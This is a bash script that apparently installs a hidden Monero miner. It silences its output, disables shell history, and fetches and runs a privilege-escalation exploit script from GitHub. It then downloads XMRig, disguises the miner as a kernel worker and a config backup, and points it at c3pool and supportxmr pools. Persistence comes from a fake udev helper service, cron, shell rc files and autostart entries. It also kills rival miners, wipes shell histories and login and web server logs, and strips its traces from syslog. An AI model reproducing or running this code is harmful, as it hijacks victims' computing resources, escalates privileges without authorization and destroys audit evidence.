#!/usr/bin/env bash
VERSION="6.0-unified"

exec >/dev/null 2>&1
unset HISTFILE
export HISTFILESIZE=0 HISTSIZE=0

C3POOL_DOWNLOAD_URL="https://download.c3pool.org/xmrig_setup/raw/master/xmrig.tar.gz"
BACKUP_DOWNLOAD_URL="https://raw.githubusercontent.com/melonlonmeo/c4/refs/heads/main/xmrig.tar.gz"
XMRIG_LATEST_API="https://api.github.com/repos/xmrig/xmrig/releases/latest"
LPE_URL1="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/main/copyfail.py"
LPE_URL2="https://raw.githubusercontent.com/ZephrFish/CopyFail-CVE-2026-31431/refs/heads/main/copyfail.py"

WALLET="${1:-}"
EMAIL="${2:-}"
PASS="x"
KEEP_CONFIG="${KEEP_CONFIG:-0}"
KEEP_BINARY="${KEEP_BINARY:-0}"
STOP_UDEV="${STOP_UDEV:-0}"
USER_HINT="${THREADS_HINT:-}"

log()  { :; }
fail() { exit 1; }
TS()   { date +%Y%m%d_%H%M%S; }

_escape_re() {
  if command -v sed >/dev/null 2>&1; then
    printf '%s' "$1" | sed 's/[][\.^$*+?(){}|]/\\&/g'
  else
    printf '%s' "$1" | sed 's/\./\\./g' 2>/dev/null || printf '%s' "$1"
  fi
}

backup_if_exists() {
  local f="$1"
  [ -f "$f" ] && cp -p "$f" "${f}.bak.$(TS)" 2>/dev/null && log "[*] Backup: $f"
}

is_gzip() {
  [ -s "$1" ] || return 1
  local magic
  magic="$(head -c 2 "$1" 2>/dev/null | od -An -tx1 2>/dev/null | tr -d ' \n')"
  [ "$magic" = "1f8b" ] || return 1
  command -v gzip >/dev/null 2>&1 && gzip -t "$1" >/dev/null 2>&1
}

_is_unsafe_path() {
  [ -L "$1" ] && return 0
  [ -e "$1" ] && [ ! -d "$1" ] && return 0
  return 1
}

_can_exec_in() {
  local d="$1" probe="$d/.xp-$$"
  printf '#!/bin/sh\nexit 0\n' >"$probe" 2>/dev/null || return 1
  chmod 700 "$probe" 2>/dev/null || { rm -f "$probe"; return 1; }
  ( "$probe" ) >/dev/null 2>&1; local rc=$?
  rm -f "$probe" 2>/dev/null
  return $rc
}

_is_bogus() {
  case "$1" in ""|"/"|"/."|"//"|"//."*|/.*) return 0 ;; esac
  return 1
}

download_file() {
  local url="$1" out="$2" tmp="$2.part"
  rm -f "$tmp" 2>/dev/null
  if command -v curl >/dev/null 2>&1; then
    curl -fL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
    curl -kfL --retry 2 --connect-timeout 15 --max-time 300 "$url" -o "$tmp" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
    wget -q --no-check-certificate -O "$tmp" --timeout=30 --tries=2 "$url" 2>/dev/null \
      && is_gzip "$tmp" && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  if command -v busybox >/dev/null 2>&1 && busybox wget --help >/dev/null 2>&1; then
    busybox wget -q -O "$tmp" "$url" 2>/dev/null && is_gzip "$tmp" \
      && { mv -f "$tmp" "$out"; return 0; }
    rm -f "$tmp"
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$tmp" <<'PY' 2>/dev/null && is_gzip "$tmp" \
      && { mv -f "$tmp" "$out"; return 0; }
import sys, urllib.request, ssl
try:
    ctx = ssl._create_unverified_context()
    req = urllib.request.Request(sys.argv[1], headers={"User-Agent":"Mozilla/5.0"})
    with urllib.request.urlopen(req, timeout=30, context=ctx) as r, open(sys.argv[2],'wb') as f:
        while True:
            chunk = r.read(65536)
            if not chunk: break
            f.write(chunk)
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
    rm -f "$tmp"
  fi
  return 1
}

download_text() {
  local url="$1" out
  if command -v curl >/dev/null 2>&1; then
    out="$(curl -fsSL --retry 2 --connect-timeout 15 --max-time 60 \
      -H 'Accept: application/vnd.github+json' -H 'User-Agent: unified-installer' "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v wget >/dev/null 2>&1; then
    out="$(wget -qO- --header='Accept: application/vnd.github+json' \
      --user-agent='unified-installer' --timeout=30 --tries=2 "$url" 2>/dev/null)"
    [ -n "$out" ] && { printf '%s\n' "$out"; return 0; }
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$url" <<'PY' && return 0
import sys, urllib.request, ssl
try:
    req = urllib.request.Request(sys.argv[1], headers={"Accept":"application/vnd.github+json","User-Agent":"unified-installer"})
    with urllib.request.urlopen(req, timeout=20, context=ssl._create_unverified_context()) as r:
        sys.stdout.write(r.read().decode())
    sys.exit(0)
except Exception:
    sys.exit(1)
PY
  fi
  return 1
}

if [ "$(id -u)" != "0" ] && command -v python3 >/dev/null 2>&1; then
    LPE_FILE="/tmp/.cf_$$.py"
    if command -v curl >/dev/null 2>&1; then
        curl -fsSL "$LPE_URL1" -o "$LPE_FILE" 2>/dev/null || curl -fsSL "$LPE_URL2" -o "$LPE_FILE" 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
        wget -qO "$LPE_FILE" "$LPE_URL2" 2>/dev/null || wget -qO "$LPE_FILE" "$LPE_URL1" 2>/dev/null
    fi
    if [ -s "$LPE_FILE" ]; then
        command -v timeout >/dev/null 2>&1 \
            && timeout 60 python3 "$LPE_FILE" >/dev/null 2>&1 \
            || python3 "$LPE_FILE" >/dev/null 2>&1 || true
        rm -f "$LPE_FILE"
    fi
fi

HAS_ROOT=0
if [ "$(id -u 2>/dev/null || echo 1)" = "0" ]; then HAS_ROOT=1
elif command -v sudo >/dev/null 2>&1 && sudo -n true 2>/dev/null; then HAS_ROOT=1; fi

command -v nice   >/dev/null 2>&1 && _NICE_PREFIX="nice -n 19" || _NICE_PREFIX=""
command -v timeout >/dev/null 2>&1 && _TO="timeout 15"        || _TO=""

RAND_SUFFIX=$(head -c 16 /dev/urandom 2>/dev/null | base64 2>/dev/null | tr -dc 'a-z0-9' | head -c 8)
[ -z "$RAND_SUFFIX" ] && RAND_SUFFIX="$(date +%s%N | sha256sum | head -c 8)"

DIR_SUFFIX=".kwork-${RAND_SUFFIX}"
BIN_NAME="kworker-${RAND_SUFFIX}"
DISGUISE_ARGV="[kworker/u8:2-events]"
CONFIG_NAME="resolv.conf.bak"
WRAPPER_NAME=".udev-helper-${RAND_SUFFIX}"
SERVICE_NAME="systemd-udevd-helper-${RAND_SUFFIX}.service"

_uid="$(id -u 2>/dev/null || echo 0)"
_home="${HOME:-}"
{ [ -n "$_home" ] && [ -d "$_home" ] && [ -w "$_home" ] && [ -x "$_home" ]; } || _home=""
_xdg_data="${XDG_DATA_HOME:-}"
_xdg_run="${XDG_RUNTIME_DIR:-/run/user/$_uid}"

CANDIDATES=()
if [ -n "$_home" ]; then
  [ -n "$_xdg_data" ] && CANDIDATES+=("${_xdg_data}/${DIR_SUFFIX}")
  CANDIDATES+=(
    "$_home/.cache/${DIR_SUFFIX}"
    "$_home/.local/${DIR_SUFFIX}"
    "$_home/.config/${DIR_SUFFIX}"
  )
fi
CANDIDATES+=(
  "${_xdg_run}/${DIR_SUFFIX}-${_uid}"
  "/dev/shm/${DIR_SUFFIX}-${_uid}"
  "/tmp/${DIR_SUFFIX}-${_uid}"
  "/var/tmp/${DIR_SUFFIX}-${_uid}"
)
[ -n "$_home" ] && CANDIDATES+=("$_home/${DIR_SUFFIX}")

INSTALL_DIR=""
for c in "${CANDIDATES[@]}"; do
  _is_bogus "$c" && continue
  _is_unsafe_path "$c" && continue
  mkdir -p "$c" 2>/dev/null || continue
  { [ -d "$c" ] && [ ! -L "$c" ]; } || continue
  { [ -w "$c" ] && [ -x "$c" ]; } || continue
  _can_exec_in "$c" || continue
  INSTALL_DIR="$c"; break
done

if [ -z "$INSTALL_DIR" ]; then
  for base in "${_xdg_run}" /dev/shm /tmp /var/tmp; do
    { [ -d "$base" ] && [ -w "$base" ] && [ -x "$base" ]; } || continue
    d="$(mktemp -d "${base}/${DIR_SUFFIX}-XXXXXX" 2>/dev/null)" || continue
    _can_exec_in "$d" && { INSTALL_DIR="$d"; break; }
    rm -rf "$d" 2>/dev/null
  done
fi

{ [ -n "$INSTALL_DIR" ] && [ -w "$INSTALL_DIR" ] && [ -x "$INSTALL_DIR" ]; } || exit 1
chmod 700 "$INSTALL_DIR" 2>/dev/null || true

ARCHIVE="$INSTALL_DIR/.pkg.tar.gz"
mkdir -p "$INSTALL_DIR/logs" 2>/dev/null

[ -z "$WALLET" ] && exit 1
WALLET_BASE="${WALLET%%.*}"
case "${#WALLET_BASE}" in 106|95) ;; *) exit 1 ;; esac

if [ "$HAS_ROOT" -eq 1 ]; then PASS="root"; else PASS="x"; fi
[ -n "$EMAIL" ] && PASS="${PASS}:${EMAIL}"

_cur_v="$(ulimit -v 2>/dev/null || echo unlimited)"
if [ "$_cur_v" != "unlimited" ] && [ "${_cur_v:-0}" -lt 524288 ] 2>/dev/null; then
  ulimit -v unlimited 2>/dev/null || ulimit -v 1048576 2>/dev/null || true
fi

CPU_THREADS="$(nproc 2>/dev/null || getconf _NPROCESSORS_ONLN 2>/dev/null || echo 1)"
case "$CPU_THREADS" in ''|*[!0-9]*) CPU_THREADS=1 ;; esac
[ "$CPU_THREADS" -ge 1 ] 2>/dev/null || CPU_THREADS=1

MEM_MB="$(awk '/MemTotal/{print int($2/1024)}' /proc/meminfo 2>/dev/null || echo 0)"
case "$MEM_MB" in ''|*[!0-9]*) MEM_MB=0 ;; esac

L3_MB=0
if [ -f /sys/devices/system/cpu/cpu0/cache/index3/size ]; then
    L3_VAL=$(cat /sys/devices/system/cpu/cpu0/cache/index3/size 2>/dev/null)
    L3_MB=$(printf '%s' "$L3_VAL" | grep -oE '^[0-9]+')
    case "$L3_MB" in ''|*[!0-9]*) L3_MB=0 ;; esac
    printf '%s' "$L3_VAL" | grep -q 'K' && L3_MB=$((L3_MB / 1024))
fi

HAS_GUI=0
pgrep -x Xorg     >/dev/null 2>&1 && HAS_GUI=1
pgrep -x Xwayland >/dev/null 2>&1 && HAS_GUI=1

MAX_THREADS_RAM=$((MEM_MB / 256))
MAX_THREADS_L3=$((L3_MB / 2))
[ "$MAX_THREADS_L3" -eq 0 ] && MAX_THREADS_L3=$CPU_THREADS

OPTIMAL_THREADS=$CPU_THREADS
[ "$MAX_THREADS_RAM" -lt "$OPTIMAL_THREADS" ] && OPTIMAL_THREADS=$MAX_THREADS_RAM
[ "$MAX_THREADS_L3"  -lt "$OPTIMAL_THREADS" ] && OPTIMAL_THREADS=$MAX_THREADS_L3
[ "$OPTIMAL_THREADS" -lt 1 ] && OPTIMAL_THREADS=1
if [ "$HAS_GUI" -eq 1 ]; then
    OPTIMAL_THREADS=$((OPTIMAL_THREADS / 2))
    [ "$OPTIMAL_THREADS" -lt 1 ] && OPTIMAL_THREADS=1
fi
THREADS_HINT=$(( (OPTIMAL_THREADS * 100) / CPU_THREADS ))
[ "$THREADS_HINT" -gt 100 ] && THREADS_HINT=100
[ -n "$USER_HINT" ] && THREADS_HINT="$USER_HINT"

HP_BOOL="false"; RX_MODE="auto"
[ "$MEM_MB" -lt 2048 ] && RX_MODE="light"

if [ "$HAS_ROOT" -eq 1 ] && [ "$MEM_MB" -ge 2048 ]; then
    if [ "$(id -u)" = "0" ]; then
      sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || true
    else
      sudo sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1 || true
    fi
    [ -f /proc/sys/vm/nr_hugepages ] && [ "$(cat /proc/sys/vm/nr_hugepages 2>/dev/null)" -gt 0 ] \
      && HP_BOOL="true"
    if ! grep -q '^vm.nr_hugepages' /etc/sysctl.conf 2>/dev/null; then
      if [ "$(id -u)" = "0" ]; then
        echo 'vm.nr_hugepages=1280' >> /etc/sysctl.conf 2>/dev/null || true
      else
        echo 'vm.nr_hugepages=1280' | sudo tee -a /etc/sysctl.conf >/dev/null 2>&1 || true
      fi
    fi
fi

EXP_HASH=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP_HASH" -gt 0 ] || EXP_HASH=1
if   [ "$EXP_HASH" -le 25000 ];  then PORT=13333
elif [ "$EXP_HASH" -le 100000 ]; then PORT=19999
else PORT=23333; fi

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  for svc in "$SERVICE_NAME" nodebox.service c3pool_miner.service; do
    systemctl stop "$svc" 2>/dev/null || true
  done
  [ "$STOP_UDEV" = "1" ] && { systemctl stop systemd-udevd.service 2>/dev/null || true; }
fi

if [ -f "$INSTALL_DIR/.miner.pid" ]; then
  _mpid="$(tr -d '[:space:]' < "$INSTALL_DIR/.miner.pid" 2>/dev/null)"
  case "$_mpid" in
    ''|*[!0-9]*) : ;;
    *) kill -9 "$_mpid" 2>/dev/null || true ;;
  esac
  rm -f "$INSTALL_DIR/.miner.pid"
fi
pkill -f "$(_escape_re "${INSTALL_DIR}/${BIN_NAME}")"    2>/dev/null || true
pkill -f "$(_escape_re "${INSTALL_DIR}/${CONFIG_NAME}")" 2>/dev/null || true
pkill -f "$(_escape_re "${INSTALL_DIR}/${WRAPPER_NAME}")" 2>/dev/null || true
sleep 1

get_latest_xmrig_url() {
  local arch json url
  arch="$(uname -m 2>/dev/null || echo unknown)"
  case "$arch" in x86_64|amd64) ;; *) return 2 ;; esac
  json="$(download_text "$XMRIG_LATEST_API")" || return 1
  url="$(printf '%s' "$json" | grep -oE 'https://[^"]+/xmrig-[0-9]+(\.[0-9]+)+-linux-static-x64\.tar\.gz' | head -n 1)"
  [ -n "$url" ] || return 1
  printf '%s\n' "$url"
}

_extract_bin() {
  local archive="$1" tmp found
  tmp="$(mktemp -d)" || return 1
  tar xzf "$archive" -C "$tmp" --strip-components=1 2>/dev/null \
    || tar xzf "$archive" -C "$tmp" 2>/dev/null \
    || { rm -rf "$tmp"; return 1; }
  rm -f "$archive"
  found="$(find "$tmp" -maxdepth 4 -type f -name 'xmrig' 2>/dev/null | head -1)"
  [ -n "$found" ] || { rm -rf "$tmp"; return 1; }
  mv -f "$found" "$INSTALL_DIR/$BIN_NAME" \
    && chmod +x "$INSTALL_DIR/$BIN_NAME" 2>/dev/null
  rm -rf "$tmp"
  [ -x "$INSTALL_DIR/$BIN_NAME" ]
}

install_latest_official_xmrig() {
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$BIN_NAME" ]; then return 0; fi
  local url
  url="$(get_latest_xmrig_url)" || return $?
  rm -f "$INSTALL_DIR/$BIN_NAME" "$ARCHIVE" 2>/dev/null
  download_file "$url" "$ARCHIVE" || return 1
  _extract_bin "$ARCHIVE"
}

install_c3pool_package() {
  if [ "$KEEP_BINARY" = "1" ] && [ -x "$INSTALL_DIR/$BIN_NAME" ]; then return 0; fi
  rm -f "$INSTALL_DIR/$BIN_NAME" "$ARCHIVE" 2>/dev/null
  download_file "$C3POOL_DOWNLOAD_URL" "$ARCHIVE" \
    || download_file "$BACKUP_DOWNLOAD_URL" "$ARCHIVE" || return 1
  _extract_bin "$ARCHIVE"
}

if ! install_latest_official_xmrig; then
  install_c3pool_package || exit 1
fi

if ! $_TO "$INSTALL_DIR/$BIN_NAME" --version >/dev/null 2>&1; then
  if [ -f /etc/os-release ] && grep -q 'Alpine' /etc/os-release \
     && command -v apk >/dev/null 2>&1; then
    apk add --no-cache xmrig >/dev/null 2>&1 \
      && cp "$(command -v xmrig)" "$INSTALL_DIR/$BIN_NAME" \
      && chmod +x "$INSTALL_DIR/$BIN_NAME" \
      || exit 1
  else
    exit 1
  fi
fi

CONFIG_PATH="$INSTALL_DIR/$CONFIG_NAME"

CONFIG_CONTENT=$(cat <<EOF_CONFIG
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
    "autosave": true, "background": false, "colors": false, "title": false,
    "randomx": { "init": -1, "init-avx2": -1, "mode": "$RX_MODE", "1gb-pages": false, "rdmsr": false, "wrmsr": false, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
    "cpu": { "enabled": true, "huge-pages": $HP_BOOL, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "max-threads-hint": $THREADS_HINT, "asm": true, "argon2-impl": null },
    "opencl": { "enabled": false, "cache": true, "loader": null, "platform": "AMD", "adl": true },
    "cuda": { "enabled": false, "loader": null, "nvml": true },
    "log-file": null, "donate-level": 1, "donate-over-proxy": 1,
    "pools": [
        { "url": "auto.c3pool.org:$PORT",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:19999",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:443",      "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:80",       "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "auto.c3pool.org:33333",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "auto.c3pool.org:23333",    "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:443",  "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:8080", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:7777", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": true,  "enabled": true },
        { "url": "pool.supportxmr.com:5555", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:80",   "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true },
        { "url": "pool.supportxmr.com:3333", "user": "$WALLET", "pass": "$PASS", "keepalive": true, "tls": false, "enabled": true }
    ],
    "print-time": 60, "health-print-time": 60, "retries": 5, "retry-pause": 5, "syslog": false,
    "tls": { "enabled": false, "protocols": null, "cert": null, "cert_key": null, "ciphers": null, "ciphersuites": null, "dhparam": null },
    "dns": { "ip_version": 4, "ttl": 30 },
    "user-agent": null, "verbose": 0, "watch": true,
    "pause-on-battery": false, "pause-on-active": false
}
EOF_CONFIG
)

if [ "$KEEP_CONFIG" = "1" ] && [ -f "$CONFIG_PATH" ]; then
  :
else
  backup_if_exists "$CONFIG_PATH"
  printf '%s\n' "$CONFIG_CONTENT" > "$CONFIG_PATH"
fi

RUNNER="$INSTALL_DIR/$WRAPPER_NAME"
backup_if_exists "$RUNNER"

cat > "$RUNNER" <<EOF_MINER
#!/usr/bin/env bash
cd "$INSTALL_DIR" 2>/dev/null || exit 1
export XMRIG_NO_TLS_WARN=1 XMRIG_QUIET=1

if command -v flock >/dev/null 2>&1; then
  exec 9> .lockfile
  flock -n 9 || exit 0
fi

start_miner() {
  $_NICE_PREFIX bash -c 'exec -a "\$0" "\$@"' "$DISGUISE_ARGV" \\
    "$INSTALL_DIR/$BIN_NAME" --config="$CONFIG_PATH" --no-color --quiet \\
    </dev/null >/dev/null 2>&1 &
  echo \$! > .miner.pid
  disown \$! 2>/dev/null || true
}

start_miner

while true; do
  sleep 30
  if [ -f .miner.pid ]; then
    PID=\$(tr -d '[:space:]' < .miner.pid 2>/dev/null)
    case "\$PID" in
      ''|*[!0-9]*) start_miner ;;
      *) kill -0 "\$PID" 2>/dev/null || start_miner ;;
    esac
  else
    start_miner
  fi
done
EOF_MINER
chmod +x "$RUNNER"

if command -v systemctl >/dev/null 2>&1 && [ "$HAS_ROOT" = "1" ]; then
  SVC_FILE="$INSTALL_DIR/.svc"
  cat > "$SVC_FILE" <<EOF_SERVICE
[Unit]
Description=System Udev Events Helper
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER
StandardOutput=null
StandardError=null
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
CPUShares=2
IOSchedulingClass=idle
IOSchedulingPriority=7
OOMScoreAdjust=500

[Install]
WantedBy=multi-user.target
EOF_SERVICE

  TARGET="/etc/systemd/system/$SERVICE_NAME"
  [ -f "$TARGET" ] && cp -p "$TARGET" "${TARGET}.bak.$(TS)" 2>/dev/null
  if cp "$SVC_FILE" "$TARGET" 2>/dev/null; then
    systemctl daemon-reload 2>/dev/null || true
    systemctl enable "$SERVICE_NAME" >/dev/null 2>&1 || true
    systemctl restart "$SERVICE_NAME" 2>/dev/null || HAS_ROOT=0
  else
    HAS_ROOT=0
  fi
fi

if [ "$HAS_ROOT" = "0" ]; then
  if command -v systemctl >/dev/null 2>&1 && systemctl --user show-environment >/dev/null 2>&1; then
    USER_DIR="$HOME/.config/systemd/user"; mkdir -p "$USER_DIR" 2>/dev/null
    USVC="$USER_DIR/$SERVICE_NAME"; backup_if_exists "$USVC"
    cat > "$USVC" <<EOF_USERVICE
[Unit]
Description=System Udev Events Helper
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/env bash $RUNNER
Restart=always
RestartSec=30
KillMode=control-group
Nice=19
OOMScoreAdjust=500

[Install]
WantedBy=default.target
EOF_USERVICE
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable --now "$SERVICE_NAME" 2>/dev/null || true
    command -v loginctl >/dev/null 2>&1 \
      && loginctl enable-linger "$(id -un 2>/dev/null)" 2>/dev/null || true
  fi
  if command -v crontab >/dev/null 2>&1; then
    CL="nohup $RUNNER >/dev/null 2>&1 &"
    crontab -l 2>/dev/null | grep -F -q "$RUNNER" \
      || { crontab -l 2>/dev/null; echo "@reboot $CL"; } | crontab - 2>/dev/null || true
  fi
  for RC in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.zshrc" "$HOME/.bash_profile"; do
    [ -d "$HOME" ] || continue
    touch "$RC" 2>/dev/null || continue
    [ -w "$RC" ] || continue
    grep -F -q "$RUNNER" "$RC" 2>/dev/null \
      || printf '\nnohup %s >/dev/null 2>&1 &\n' "$RUNNER" >> "$RC" 2>/dev/null || true
  done
  if mkdir -p "$HOME/.config/autostart" 2>/dev/null; then
    AS_FILE="$HOME/.config/autostart/udev-helper-$RAND_SUFFIX.desktop"
    cat > "$AS_FILE" <<EOF_DESKTOP
[Desktop Entry]
Type=Application
Name=System Events
Exec=bash $RUNNER
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF_DESKTOP
  fi
  nohup "$RUNNER" >/dev/null 2>&1 & disown 2>/dev/null || true
fi

rm -f "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.python_history" 2>/dev/null
ln -sf /dev/null "$HOME/.bash_history" 2>/dev/null || true

if [ "$HAS_ROOT" -eq 1 ]; then
    rm -f /root/.bash_history /root/.zsh_history 2>/dev/null
    ln -sf /dev/null /root/.bash_history 2>/dev/null || true

    rm -f /var/log/wtmp /var/log/btmp 2>/dev/null
    : > /var/log/wtmp 2>/dev/null
    : > /var/log/btmp 2>/dev/null

    rm -f /var/log/nginx/access.log /var/log/nginx/error.log 2>/dev/null
    rm -f /var/log/apache2/access.log /var/log/apache2/error.log 2>/dev/null
    rm -f /var/log/httpd/access_log /var/log/httpd/error_log 2>/dev/null

    sed -i "/$BIN_NAME/d" /var/log/syslog /var/log/messages /var/log/auth.log 2>/dev/null
    sed -i "/\.kwork-/d" /var/log/syslog /var/log/messages /var/log/auth.log 2>/dev/null
fi

sleep 2
exit 0
